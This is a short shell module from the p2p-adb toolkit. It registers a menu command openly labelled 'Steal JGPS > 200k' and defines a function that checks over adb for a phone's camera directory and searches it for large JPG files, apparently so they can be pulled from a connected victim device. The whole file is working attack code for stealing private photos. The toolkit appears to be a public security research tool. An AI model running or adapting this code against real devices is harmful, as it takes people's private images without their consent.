# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


# Registering command
registerCommand "4:getJpgs:Steal JGPS > 200k"


getJpgs(){
	DIREXISTS=$(adb shell '[[ -d /sdcard/DCIM/Camera/  ]] && echo 1' | tr -d "\r")

	if [ "$DIREXISTS" = "1" ]; then
		DATAPATH='/sdcard/DCIM/Camera'
		getSearch "$DATAPATH" "*.jpg" "+200k"
	else
		echo "Camera directory doesn't exist?"
	fi
}
